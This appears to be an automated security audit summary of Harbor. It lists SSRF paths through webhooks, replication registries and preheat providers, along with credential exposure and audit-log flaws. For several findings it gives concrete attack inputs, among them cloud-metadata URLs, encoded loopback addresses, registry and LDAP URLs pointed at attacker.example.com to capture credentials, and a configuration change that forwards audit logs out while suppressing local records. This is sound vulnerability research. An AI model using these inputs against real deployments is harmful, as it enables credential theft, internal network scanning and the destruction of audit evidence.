# Deep Probe Summary: SSRF Paths (Webhook, Replication, Preheat) + Configuration & Audit

**Status:** complete
**Loops:** 1 (with 3 reasoning rounds: backward, contradiction, causal)
**Total hypotheses:** 23 (including cross-model variants)
**Validated:** 19
**Needs-Deeper:** 3
**Invalidated:** 1
**Stop reason:** All entry points covered across all three SSRF vectors plus audit/config paths; no Fragile invalidated items requiring re-investigation; hook_client and Kraken driver gaps confirmed closed.

---

## Validated Hypotheses

### PH-01: Webhook SSRF — No Private IP Filtering
- **Reasoning-Model:** Pre-Mortem
- **Target:** `src/server/v2.0/handler/webhook.go:410-415` — `validateTargets`; `src/jobservice/job/impl/notification/webhook_job.go:101-120` — `execute`
- **Attack input:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as webhook target address
- **Code path:** `validateTargets` → `ParseEndpoint` (scheme check only, no IP check) → stored in DB → WebhookJob enqueued → `execute` → `http.Client.Do(POST to address)` — no re-validation at execution
- **Sanitizers on path:** `ParseEndpoint` — bypassable: checks scheme only; strips userinfo but not private IPs
- **Security consequence:** Job Service makes outbound HTTP POST to any IP reachable from its container, including cloud metadata services (AWS `169.254.169.254`, GCP `metadata.google.internal`), internal RFC1918 addresses, and loopback
- **Severity estimate:** HIGH
- **Evidence file:** round-1-evidence.md (Entry 001)

### PH-06: Webhook auth_header Creates Authenticated SSRF
- **Reasoning-Model:** Abductive
- **Target:** `src/pkg/notifier/handler/notification/http_handler.go:78-79` — header construction; `src/jobservice/job/impl/notification/webhook_job.go:110-116` — header injection into request
- **Attack input:** Webhook target with `auth_header = "Bearer <internal-service-token>"` and `address = "https://internal-service/"` and `skip_cert_verify = true`
- **Code path:** `HTTPHandler.process` → `header.Set("Authorization", event.Target.AuthHeader)` → job params `header = JSON({Content-Type, Authorization})` → `WebhookJob.execute` → `req.Header = header` → `wj.client.Do(req)` (insecure transport if skip_cert_verify)
- **Sanitizers on path:** None — Authorization header value is user-controlled string
- **Security consequence:** Project admin can perform authenticated internal service access (e.g., Kubernetes API, internal APIs requiring Bearer tokens) with TLS verification disabled for self-signed certs
- **Severity estimate:** HIGH
- **Evidence file:** round-1-evidence.md (Entry 002)

### PH-03 / PH-C03: Audit Log Forward Endpoint TCP Port Scan Oracle
- **Reasoning-Model:** Abductive + Causal Verification
- **Target:** `src/pkg/audit/forward.go:64-76` — `CheckEndpointActive`; `src/controller/config/controller.go:100-113` — `updateLogEndpoint`
- **Attack input:** System admin iterates `audit_log_forward_endpoint` = `"<target-host>:<port>"` in successive `PUT /api/v2.0/configurations` requests
- **Code path:** `UpdateConfigurations` → `UpdateUserConfigs` → `updateLogEndpoint` → `CheckEndpointActive` → `syslog.Dial("tcp", address)` → TCP SYN to target → error returned to HTTP caller with distinguishable messages
- **Sanitizers on path:** None — `syslog.Dial` accepts raw `"host:port"` string with no IP or scheme validation
- **Security consequence:** System admin can TCP port-scan any host reachable from Core container. Error message oracle (connection refused vs syslog error vs timeout) distinguishes open/closed/filtered ports. Full internal network mapping possible.
- **Severity estimate:** HIGH
- **Evidence file:** round-1-evidence.md (Entry 003)

### PH-12 / PH-C06: Persistent Audit Log Exfiltration + Evidence Destruction
- **Reasoning-Model:** TRIZ Contradiction + Causal Verification
- **Target:** `src/pkg/audit/forward.go:38-52` — `LoggerManager.Init`; `src/pkg/auditext/manager.go:80-88` — `Create`
- **Attack input:** Single `PUT /api/v2.0/configurations` request setting both `skip_audit_log_database = true` and `audit_log_forward_endpoint = "<attacker-syslog>:<port>"`
- **Code path:** Config saved → new config active → all subsequent `auditext.Mgr.Create` calls: (1) forward event to attacker syslog via `syslog.Dial`, (2) skip DB write because `SkipAuditLogDatabase=true`. The config-change event itself is NOT written to the DB (new config is active when the event is generated after handler returns).
- **Sanitizers on path:** None for the syslog endpoint; `verifySkipAuditLogCfg` prevents enabling skip-DB without an endpoint but does not validate the endpoint
- **Security consequence:** (1) All audit events (operator, resource, operation) forwarded to attacker's syslog server permanently. (2) Harbor's own audit log trail goes dark — no record in `audit_log_ext` table. (3) The config change that enables this exfiltration is itself not recorded in Harbor's audit log. CRITICAL evidence destruction.
- **Severity estimate:** CRITICAL (when combined — visibility and traceability are eliminated)
- **Evidence file:** round-1-evidence.md (Entry 004)

### PH-13 / PH-C04: Replication Registry Credential Theft via URL Pivot
- **Reasoning-Model:** Game-Theory + Causal Verification
- **Target:** `src/server/v2.0/handler/registry.go:46-76` — `CreateRegistry`; `src/pkg/reg/adapter/native/adapter.go:66-78` — `NewAdapter`
- **Attack input:** System admin creates or updates a registry record with `url = "http://attacker.example.com"` plus any `credential.access_key/access_secret`
- **Code path:** `CreateRegistry` stores URL+credentials (AccessSecret encrypted in DB). `GetRegistryInfo` → `HealthCheck` → `native.NewAdapter(reg)` → `registry.NewClientWithCACert(reg.URL, username, password)` → HTTP GET `{url}/v2/` with `Authorization: Basic <base64(key:secret)>`. No private IP filtering.
- **Sanitizers on path:** CA certificate is validated if provided; URL itself has no validation
- **Security consequence:** Plaintext registry credentials (decrypted in memory) transmitted to attacker-controlled server on first health check ping. Can be triggered immediately via `GetRegistryInfo` without waiting for replication job.
- **Severity estimate:** HIGH
- **Evidence file:** round-1-evidence.md (Entry 005)

### PH-C08: Registry Credentials Stored in Plaintext in Redis Job Queue
- **Reasoning-Model:** Causal Verification (new finding from round-3)
- **Target:** `src/controller/replication/flow/copy.go:125-144` — job parameter serialization; `src/pkg/reg/manager.go:218-249` — `fromDaoModel` (decrypt on load)
- **Attack input:** Any replication job execution (attacker reads Redis queue)
- **Code path:** `fromDaoModel` decrypts `AccessSecret` from DB → `model.Resource{Registry{Credential{AccessSecret: plaintext}}}` → `json.Marshal(srcResource)` → stored as `"src_resource"` string in Redis job parameters → accessible to anyone with Redis read access
- **Sanitizers on path:** Encryption at DB layer (ReversibleEncrypt), but decrypted in memory and stored in plaintext in Redis job queue
- **Security consequence:** All registry credentials for pending/active replication jobs are accessible in plaintext from Redis. Combined with the KB finding that Redis often has no authentication in Harbor deployments, this is a systemic credential exposure for all configured registry endpoints.
- **Severity estimate:** HIGH
- **Evidence file:** round-1-evidence.md (Entry 006)

### PH-05 / PH-C07: Solution-User GetConfigurations Returns Passwords
- **Reasoning-Model:** Pre-Mortem + Causal Verification
- **Target:** `src/server/v2.0/handler/config.go:41-58` — `GetConfigurations` solution-user branch
- **Attack input:** HTTP request to `GET /api/v2.0/configurations` with `Authorization: Harbor-Secret <internal-secret>` (solution-user auth)
- **Code path:** `IsSolutionUser()` → `AllConfigs(ctx)` (returns all fields) → `json.Marshal(cfg)` → response. No `ConvertForGet(internal=false)` stripping applied. `ldap_search_password`, `oidc_client_secret`, and other PasswordType fields returned.
- **Sanitizers on path:** `IsSolutionUser()` check — bypassable if internal shared secret is compromised
- **Security consequence:** Full credential exfiltration of all system secrets in a single API call. Compromise of solution-user secret (e.g., from container environment variable access, Kubernetes secret exposure) leads to complete credential theft.
- **Severity estimate:** CRITICAL
- **Evidence file:** round-1-evidence.md (Entry 007)

### PH-04 / PH-C05: Preheat Provider SSRF Including IP Encoding Bypasses
- **Reasoning-Model:** Abductive + Causal Verification
- **Target:** `src/lib/endpoint.go:27-45` — `ValidateHTTPURL`; `src/pkg/p2p/preheat/provider/dragonfly.go:199-213` — `GetHealth`
- **Attack input:** Preheat provider endpoint `http://169.254.169.254/` or `http://0x7f000001/` or `http://127.1/`
- **Code path:** Provider registered with malicious endpoint → preheat job runs → `GetHealth` → `lib.ValidateHTTPURL(url)` passes (scheme-only check) → `client.GetHTTPClient(insecure).Get(url)` → HTTP GET to metadata or internal service
- **Sanitizers on path:** `lib.ValidateHTTPURL` — bypassable: scheme check only; does not normalize hex/decimal/IPv6-mapped representations
- **Security consequence:** Same as PH-01 but via preheat path. Encoded IP forms bypass even manual IP string comparison if one were added. Applies equally to Kraken driver.
- **Severity estimate:** HIGH
- **Evidence file:** round-1-evidence.md (Entry 008)

### PH-18: LDAP/OIDC Endpoint Pivot
- **Reasoning-Model:** Game-Theory
- **Target:** `src/controller/config/controller.go:115-147` — `validateCfg`
- **Attack input:** System admin updates `ldap_url = "ldap://attacker.example.com"` or `oidc_endpoint = "https://attacker.example.com/oidc"`
- **Code path:** `UpdateConfigurations` → `validateCfg` (validates auth mode, value length, skip-audit-log constraints — does NOT validate LDAP/OIDC URLs) → config stored → all subsequent LDAP/OIDC auth attempts use attacker-controlled endpoint
- **Sanitizers on path:** None for URL-type config fields
- **Security consequence:** System admin can redirect all LDAP or OIDC authentication to an attacker-controlled server. Attacker's LDAP server accepts any credentials → mass account takeover. Attacker's OIDC provider issues tokens with arbitrary claims → impersonate any Harbor user.
- **Severity estimate:** HIGH (requires system-admin; amplifies to compromise of all user accounts)
- **Evidence file:** round-1-evidence.md (Entry 009)

### PH-02 / PH-15: Replication Registry SSRF via GetRegistryInfo
- **Reasoning-Model:** Pre-Mortem + Game-Theory
- **Target:** `src/server/v2.0/handler/registry.go:179` — `GetRegistryInfo`; `src/pkg/reg/adapter/native/adapter.go:118` — `HealthCheck`
- **Attack input:** System admin creates registry with `url = "http://10.0.0.1:8080"` then calls `GET /api/v2.0/registries/{id}/info`
- **Code path:** `GetRegistryInfo` → registry controller → `CreateAdapter` → `HealthCheck` → HTTP GET `{url}/v2/` → immediate SSRF with no delay
- **Sanitizers on path:** None
- **Security consequence:** Immediate SSRF probe to internal network. Response timing and content distinguish open/closed/filtered. Periodic health check scheduling means SSRF repeats automatically.
- **Severity estimate:** MEDIUM (requires system-admin; same actor as PH-03 but via HTTP not TCP)
- **Evidence file:** round-1-evidence.md (Entry 005)

### PH-09: False-Fix Comment in validateTargets
- **Reasoning-Model:** TRIZ Contradiction
- **Target:** `src/server/v2.0/handler/webhook.go:414`
- **Code evidence:** Comment `// Prevent SSRF security issue #3755` followed by code that only strips userinfo/fragment, not private IPs
- **Security consequence:** Creates false assurance for code reviewers. The SSRF protection is incomplete and the comment obscures the gap.
- **Severity estimate:** Informational (root cause documentation for PH-01)
- **Evidence file:** round-2-hypotheses.md (PH-09)

### PH-10: skip_cert_verify Extends SSRF to Internal HTTPS Services
- **Reasoning-Model:** TRIZ Contradiction
- **Target:** `src/jobservice/job/impl/notification/webhook_job.go:91-96`
- **Attack input:** `skip_cert_verify = true` in webhook target
- **Security consequence:** Insecure HTTP client (TLS verification disabled) used for SSRF, enabling access to internal HTTPS services with self-signed certificates (e.g., Kubernetes API server)
- **Severity estimate:** HIGH (amplifier for PH-01)
- **Evidence file:** round-2-hypotheses.md (PH-10)

### PH-07 / PH-C02: DNS Rebinding Architectural Gap
- **Reasoning-Model:** Pre-Mortem + Causal Verification
- **Target:** Gap between `validateTargets` (store-time) and `WebhookJob.execute` (execution-time)
- **Security consequence:** Any future IP-based denylist added only at store time would be bypassed by DNS rebinding. The fundamental architecture (validate at store, execute later) requires DNS pinning or execution-time IP validation.
- **Severity estimate:** HIGH (architectural design flaw)
- **Evidence file:** round-3-hypotheses.md (PH-C02)

### PH-11: CheckEndpointActive = TCP Probe (Validation-as-SSRF)
- **Reasoning-Model:** TRIZ Contradiction
- **Target:** `src/pkg/audit/forward.go:65` — `CheckEndpointActive`
- **Security consequence:** The "validation" function used to verify audit endpoint is itself the TCP SSRF probe. This is a direct exploitation of the validation mechanism.
- **Severity estimate:** HIGH (same impact as PH-03; confirms the channel)
- **Evidence file:** round-2-hypotheses.md (PH-11)

---

## NEEDS-DEEPER

### PH-08: Preheat Image URL + Headers Forwarded to Dragonfly
- **Why unresolved:** `preheatingImage.URL` is normally a Harbor-internal artifact URL. The `Headers` field contains Harbor Bearer tokens needed for Dragonfly to pull the image. This is by design. The security concern is whether the Dragonfly operator is trusted and whether tokens can be stolen.
- **Suggested follow-up:** Phase 8 should examine: (1) What Harbor token scope is included in the preheat headers — is it a scoped token or a full admin token? (2) Is there any threat model documentation for Dragonfly as a trusted vs untrusted P2P network? (3) Can the `preheatingImage.URL` be influenced by an attacker to point to an external registry?

### PH-14: Purge SQL Fragile Allowlist
- **Why unresolved:** Current `model.EventTypes` values appear safe (no single quotes). The risk is future-facing — a new event type with a single-quote character would bypass the allowlist and inject SQL.
- **Suggested follow-up:** Phase 8 should add a static analysis check that `model.EventTypes` values never contain SQL injection characters, and recommend changing the `Purge` SQL to use parameterized queries with `IN (?, ?, ?)` instead of string interpolation.

### PH-17: Webhook Job Queue Exhaustion (DoS)
- **Why unresolved:** Need to verify Job Service worker concurrency limits and whether webhook jobs have a separate bounded queue.
- **Suggested follow-up:** Phase 8 should check `c_worker.go` concurrency settings and whether there is a per-project or per-policy rate limit on webhook job creation.

---

## Coverage Summary

| Entry Point | backward-reasoner-03 | contradiction-reasoner-03 | causal-verifier-03 |
|------------|:-:|:-:|:-:|
| Webhook URL (validateTargets) | PH-01, PH-07 | PH-09, PH-10 | PH-C01, PH-C02 |
| Webhook auth_header | PH-06 | — | PH-C01 |
| Replication registry URL (CreateRegistry) | PH-02, PH-13 | PH-15 | PH-C04 |
| Replication job Redis params | — | — | PH-C08 |
| Preheat provider endpoint | PH-04 | — | PH-C05 |
| Preheat image URL/headers to provider | PH-08 | — | — |
| Audit log forward endpoint (TCP) | PH-03 | PH-11, PH-12 | PH-C03, PH-C06 |
| Config update (LDAP/OIDC URLs) | — | PH-18 | PH-18 evidence |
| GetConfigurations solution-user branch | PH-05 | — | PH-C07 |
| GetInternalconfig | PH-05 | — | PH-C07 |
| hook_client WebHookURL | N/A | N/A | CONFIRMED internal-only (closed) |
| Kraken driver endpoint | Covered by PH-04 pattern | — | Same as Dragonfly |

---

## Key Findings Synopsis

**CRITICAL (2):**
1. `audit_log_forward_endpoint` + `skip_audit_log_database` = evidence destruction (PH-12/C06)
2. Solution-user `GET /api/v2.0/configurations` returns all passwords including LDAP/OIDC secrets (PH-05/C07)

**HIGH (8):**
1. Webhook SSRF — no private IP filtering, direct access to 169.254.169.254 (PH-01)
2. Webhook `auth_header` + `skip_cert_verify` = authenticated SSRF to internal HTTPS services (PH-06, PH-10)
3. Audit log forward endpoint = TCP port scan oracle (PH-03/C03)
4. Preheat provider endpoint SSRF including IP-encoding bypasses (PH-04/C05)
5. Replication registry credential theft via URL pivot (PH-13/C04)
6. Registry credentials in plaintext in Redis job queue (PH-C08)
7. LDAP/OIDC endpoint pivot to attacker identity provider (PH-18)
8. DNS rebinding architectural gap (PH-07/C02)

**MEDIUM (1):**
1. GetRegistryInfo immediate SSRF probe (PH-02/PH-15)

**Root cause (1):**
1. False-fix comment in validateTargets creates false assurance (PH-09)
